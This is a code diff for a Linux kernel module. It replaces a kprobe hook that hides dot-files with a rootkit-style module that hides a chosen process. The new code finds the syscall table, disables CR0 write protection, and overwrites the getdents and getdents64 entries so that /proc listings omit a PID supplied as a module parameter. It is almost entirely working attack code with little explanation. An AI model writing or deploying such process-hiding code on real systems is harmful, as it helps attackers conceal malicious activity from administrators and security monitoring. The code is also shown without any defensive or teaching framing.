@@ -1,142 +1,179 @@
-#include <linux/kernel.h>
+#include <linux/sched.h>
 #include <linux/module.h>
-#include <linux/kprobes.h>
 #include <linux/syscalls.h>
-#include <linux/uaccess.h>
-#include <linux/fs.h>
+#include <linux/dirent.h>
 #include <linux/slab.h>
+#include <linux/version.h> 
+#include <linux/proc_ns.h>
+#include <linux/fdtable.h>
+#include <linux/uaccess.h>
+#ifndef __NR_getdents
+#define __NR_getdents 141
+#endif
 
-static struct kprobe kp;
-static unsigned long getdents64_addr = 0;
+#define MODULE_NAME "lkmdemo"
 
-struct linux_dirent64 {
-	u64        d_ino;
-	s64        d_off;
-	unsigned short d_reclen;
-	unsigned char  d_type;
-	char       d_name[];
+static int hidden_pid = 0; // PID to hide, passed from userspace
+module_param(hidden_pid, int, 0644);
+MODULE_PARM_DESC(hidden_pid, "PID of the process to hide");
+
+struct linux_dirent {
+    unsigned long   d_ino;
+    unsigned long   d_off;
+    unsigned short  d_reclen;
+    char            d_name[1];
 };
 
-/* The real getdents64 system call pointer */
-static asmlinkage long (*real_getdents64)(unsigned int, struct linux_dirent64 __user *, unsigned int);
+unsigned long cr0;
+static unsigned long *__sys_call_table;
+typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
+static t_syscall orig_getdents;
+static t_syscall orig_getdents64;
 
-/* Modified getdents64 with filtering logic */
-static asmlinkage long hooked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);
-
-/* Pre-handler: Intercepts the getdents64 call and replaces it with our hooked version */
-int handler_pre(struct kprobe *p, struct pt_regs *regs)
+unsigned long * get_syscall_table_bf(void)
 {
-	unsigned int fd = (unsigned int)regs->di;    // First argument: file descriptor
-	struct linux_dirent64 __user *dirp = (struct linux_dirent64 __user *)regs->si; // Second argument: dirp (directory entries buffer)
-	unsigned int count = (unsigned int)regs->dx; // Third argument: count (buffer size)
-
-	printk(KERN_INFO "kprobe: Intercepting getdents64 (fd=%u, count=%u)\n", fd, count);
-
-	/* Replace the real getdents64 system call with our hooked version */
-	regs->ax = hooked_getdents64(fd, dirp, count);
-
-	return 1;  // Returning 1 indicates to skip the execution of the original system call
+    unsigned long *syscall_table;
+    syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
+    return syscall_table;
 }
 
-/* Post-handler: This will be called after `getdents64` is executed, but since we are replacing the call in pre-handler, it's unused here */
-void handler_post(struct kprobe *p, struct pt_regs *regs, unsigned long flags)
-{
-	printk(KERN_INFO "kprobe: getdents64 post-handler (unused in this example)\n");
+static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs) {
+    struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;
+    int ret = orig_getdents64(pt_regs), err;
+    unsigned long off = 0;
+    struct linux_dirent64 *dir, *kdirent, *prev = NULL;
+
+    if (ret <= 0)
+        return ret;
+
+    kdirent = kzalloc(ret, GFP_KERNEL);
+    if (kdirent == NULL)
+        return ret;
+
+    err = copy_from_user(kdirent, dirent, ret);
+    if (err)
+        goto out;
+
+    while (off < ret) {
+        dir = (void *)kdirent + off;
+        
+        // Convert file name to PID and compare
+        if (hidden_pid != 0 && simple_strtoul(dir->d_name, NULL, 10) == hidden_pid) {
+            if (dir == kdirent) {
+                ret -= dir->d_reclen;
+                memmove(dir, (void *)dir + dir->d_reclen, ret);
+                continue;
+            }
+            prev->d_reclen += dir->d_reclen;
+        } else {
+            prev = dir;
+        }
+
+        off += dir->d_reclen;
+    }
+
+    err = copy_to_user(dirent, kdirent, ret);
+    if (err)
+        goto out;
+    
+out:
+    kfree(kdirent);
+    return ret;
 }
 
-/* Fault-handler: Called if there's an error during the probe */
-int handler_fault(struct kprobe *p, struct pt_regs *regs, int trapnr)
-{
-	printk(KERN_ERR "kprobe: Fault occurred at getdents64\n");
-	return 0;
+static asmlinkage long hacked_getdents(const struct pt_regs *pt_regs) {
+    struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;
+    int ret = orig_getdents(pt_regs), err;
+    unsigned long off = 0;
+    struct linux_dirent *dir, *kdirent, *prev = NULL;
+
+    if (ret <= 0)
+        return ret;    
+
+    kdirent = kzalloc(ret, GFP_KERNEL);
+    if (kdirent == NULL)
+        return ret;
+
+    err = copy_from_user(kdirent, dirent, ret);
+    if (err)
+        goto out;
+
+    while (off < ret) {
+        dir = (void *)kdirent + off;
+
+        // Convert file name to PID and compare
+        if (hidden_pid != 0 && simple_strtoul(dir->d_name, NULL, 10) == hidden_pid) {
+            if (dir == kdirent) {
+                ret -= dir->d_reclen;
+                memmove(dir, (void *)dir + dir->d_reclen, ret);
+                continue;
+            }
+            prev->d_reclen += dir->d_reclen;
+        } else {
+            prev = dir;
+        }
+
+        off += dir->d_reclen;
+    }
+
+    err = copy_to_user(dirent, kdirent, ret);
+    if (err)
+        goto out;
+
+out:
+    kfree(kdirent);
+    return ret;
 }
 
-/* Hooked getdents64: Modifies the behavior of the original system call */
-static asmlinkage long hooked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count)
+static inline void write_cr0_forced(unsigned long val)
 {
-	long ret;
-	struct linux_dirent64 *current_dir, *previous_dir, *dirent_ker;
-	unsigned long offset = 0;
-
-	/* Call the real getdents64 system call */
-	ret = real_getdents64(fd, dirp, count);
-	if (ret <= 0)
-		return ret;
-
-	/* Allocate kernel memory to modify the directory entries */
-	dirent_ker = kzalloc(ret, GFP_KERNEL);
-	if (!dirent_ker)
-		return ret;
-
-	/* Copy directory entries from user space */
-	if (copy_from_user(dirent_ker, dirp, ret)) {
-		kfree(dirent_ker);
-		return ret;
-	}
-
-	/* Traverse directory entries and filter out entries starting with '.' */
-	previous_dir = NULL;
-	while (offset < ret) {
-		current_dir = (struct linux_dirent64 *)((char *)dirent_ker + offset);
-		offset += current_dir->d_reclen;
-
-		/* Hide files that start with '.' */
-		if (current_dir->d_name[0] == '.') {
-			if (previous_dir)
-				previous_dir->d_reclen += current_dir->d_reclen;
-			else
-				ret -= current_dir->d_reclen;
-		} else {
-			previous_dir = current_dir;
-		}
-	}
-
-	/* Copy the modified directory entries back to user space */
-	if (copy_to_user(dirp, dirent_ker, ret)) {
-		kfree(dirent_ker);
-		return ret;
-	}
-
-	kfree(dirent_ker);
-	return ret;
+    unsigned long __force_order;
+    asm volatile(
+        "mov %0, %%cr0"
+        : "+r"(val), "+m"(__force_order));
 }
 
-/* Module initialization */
-static int __init kprobe_init(void)
+static inline void protect_memory(void)
 {
-	int ret;
-
-	/* Register kprobe for getdents64 system call */
-	kp.symbol_name = "__x64_sys_getdents64";  // Function name to probe
-	kp.pre_handler = handler_pre;
-	kp.post_handler = handler_post;
-	kp.fault_handler = handler_fault;
-
-	/* Register the kprobe */
-	ret = register_kprobe(&kp);
-	if (ret < 0) {
-		printk(KERN_ERR "kprobe: Failed to register kprobe, error: %d\n", ret);
-		return ret;
-	}
-
-	/* Store the real getdents64 address */
-	real_getdents64 = (void *)kp.addr;
-	printk(KERN_INFO "kprobe: Registered on getdents64 at address: 0x%lx\n", (unsigned long)real_getdents64);
-
-	/* Now we are ready to replace getdents64 with our hooked function */
-	return 0;
+    write_cr0_forced(cr0);
 }
 
-/* Module cleanup */
-static void __exit kprobe_exit(void)
+static inline void unprotect_memory(void)
 {
-	unregister_kprobe(&kp);
-	printk(KERN_INFO "kprobe: Unregistered\n");
+    write_cr0_forced(cr0 & ~0x00010000);
 }
 
-module_init(kprobe_init);
-module_exit(kprobe_exit);
+static int __init lkmdemo_init(void)
+{
+    __sys_call_table = get_syscall_table_bf();
+    if (!__sys_call_table)
+        return -1;
 
-MODULE_LICENSE("GPL");
-MODULE_AUTHOR("Your Name");
-MODULE_DESCRIPTION("Kprobe example to hook and modify getdents64 using struct pt_regs");
+    cr0 = read_cr0();
+    orig_getdents = (t_syscall)__sys_call_table[__NR_getdents];
+    orig_getdents64 = (t_syscall)__sys_call_table[__NR_getdents64];
+    unprotect_memory();
+    __sys_call_table[__NR_getdents] = (unsigned long) hacked_getdents;
+    __sys_call_table[__NR_getdents64] = (unsigned long) hacked_getdents64;
+    protect_memory();
+
+    printk(KERN_INFO "Module loaded: hiding PID %d\n", hidden_pid);
+    return 0;
+}
+
+static void __exit lkmdemo_cleanup(void)
+{
+    unprotect_memory();
+    __sys_call_table[__NR_getdents] = (unsigned long) orig_getdents;
+    __sys_call_table[__NR_getdents64] = (unsigned long) orig_getdents64;
+    protect_memory();
+
+    printk(KERN_INFO "Module unloaded\n");
+}
+
+module_init(lkmdemo_init);
+module_exit(lkmdemo_cleanup);
+
+MODULE_LICENSE("Dual BSD/GPL");
+MODULE_AUTHOR("demo");
+MODULE_DESCRIPTION("LKM to hide a process by its PID");
